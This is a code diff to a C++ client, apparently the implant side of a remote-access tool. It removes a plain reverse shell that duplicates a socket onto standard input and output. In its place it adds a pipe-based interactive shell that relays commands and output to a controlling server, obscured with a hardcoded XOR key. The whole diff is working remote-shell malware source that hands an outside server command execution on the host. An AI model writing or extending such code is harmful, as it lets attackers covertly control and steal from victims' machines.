@@ -2,10 +2,69 @@
 #include "Commands.hpp"
 #include "Misc.hpp"
 
+void Client::threadReadShell(int& Pipe){
+	fcntl(Pipe, F_SETFL, O_NONBLOCK); //make fd non-block so stop when program exits
+	char cCmdOutput[256];
+	std::string strCmdOutput = "";
+	std::string strPassword = "password";
+	std::string strCmd = "";
+	int iRet = 0, iLen = 0;
+	while(isRunningShell){
+		while((iRet = read(Pipe, &cCmdOutput, 255)) == -1){ //sleep until reads data or loop break
+			usleep(100000);
+			continue;
+		}
+		cCmdOutput[iRet] = '\0';
+		strCmd = cCmdOutput;
+		strCmdOutput = txtCipher.ShellXor(strCmd, strPassword);
+		iLen = strCmdOutput.length();
+		iRet = send(sckSocket, strCmdOutput.c_str(), iLen, 0);
+		#ifdef _DEBUG
+		std::cout<<"Sent "<<iRet<<" bytes\n";
+		#endif
+		if(iRet <= 0){
+			#ifdef _DEBUG
+			std::cout<<"Unable to send shell output to server\n";
+			error();
+			#endif
+			break;
+		}
+	}
+}
+
 void Client::SpawnShell(const std::string strCommand){
 	#ifdef _DEBUG
 	std::cout<<"Spawn "<<strCommand<<'\n';
 	#endif
+	int InPipeFD[2], OutPipeFD[2];
+	if(pipe(InPipeFD) == -1){
+		#ifdef _DEBUG
+		std::cout<<"pipe error\n";
+		error();
+		#endif
+		if(ssSendBinary(CommandCodes::cShellError) <= 0){
+			#ifdef _DEBUG
+			std::cout<<"Unable to send command to server\n";
+			error();
+			#endif
+		}
+		return;
+	}
+	if(pipe(OutPipeFD) == -1){
+		#ifdef _DEBUG
+		std::cout<<"pipe error\n";
+		error();
+		#endif
+		close(InPipeFD[0]);
+		close(InPipeFD[1]);
+		if(ssSendBinary(CommandCodes::cShellError) <= 0){
+			#ifdef _DEBUG
+			std::cout<<"Unable to send command to server\n";
+			error();
+			#endif
+		}
+		return;
+	}
 	pid_t pP = fork();
 	if(pP == 0){ //child running
 		if(ssSendBinary(CommandCodes::cShellRunning) <= 0){
@@ -18,20 +77,56 @@ void Client::SpawnShell(const std::string strCommand){
 		#ifdef _DEBUG
 		std::cout<<"Shell running\n";
 		#endif
-		dup2(sckSocket, 0);
-		dup2(sckSocket, 1);
-		dup2(sckSocket, 2);
+		dup2(InPipeFD[0], 0);
+		dup2(OutPipeFD[1], 1);
+		dup2(OutPipeFD[1], 2);
+		close(InPipeFD[0]);
+		close(InPipeFD[1]);
+		close(OutPipeFD[0]);
+		close(OutPipeFD[1]);
 		char *argv[] = {nullptr};
 		char *env[] = {nullptr};
 		execve(strCommand.c_str(), argv, env);
 		exit(0);
-	} else if(pP > 0) { //parent
-		wait(nullptr);
-		#ifdef _DEBUG
-		std::cout<<"Shell ends\n";
-		#endif
+	} else if(pP > 0) {
+		close(InPipeFD[0]);
+		close(OutPipeFD[1]);
+		isRunningShell = true;
+		//read from OutPipeFD[0]
+		std::thread t1(&Client::threadReadShell, this, std::ref(OutPipeFD[0]));
+		
+		//here read from socket and write to pipe
+		std::string strCmdBuffer = "";
+		char cCmdBuffer[512];
+		int iBytes = 0;
+		while(isRunningShell){
+			iBytes = recv(sckSocket, cCmdBuffer, 512, 0);
+			if(iBytes <= 0){
+				isRunningShell = false;
+				#ifdef _DEBUG
+				std::cout<<"Unable to receive command from server\n";
+				error();
+				#endif
+				break;
+			}
+			cCmdBuffer[iBytes] = '\0';
+			strCmdBuffer = txtCipher.ShellXor(std::string(cCmdBuffer), std::string("password"));
+			#ifdef _DEBUG
+			std::cout<<"Command "<<strCmdBuffer<<'\n';
+			#endif
+			//write to InPipeFD[1] 
+			write(InPipeFD[1], strCmdBuffer.c_str(), strCmdBuffer.length());
+			if(strcmp(strCmdBuffer.c_str(), "exit\n") == 0){
+				#ifdef _DEBUG
+				std::cout<<"\nbye\n";
+				#endif
+				isRunningShell = false;
+				break;
+			}
+		}
+		t1.join();
+		
 		if(send(sckSocket, CommandCodes::cShellEnd, 3, 0) <= 0){
-		//if(ssSendBinary(CommandCodes::cShellEnd) <= 0){
 			#ifdef _DEBUG
 			std::cout<<"Unable to send command to server\n";
 			error();
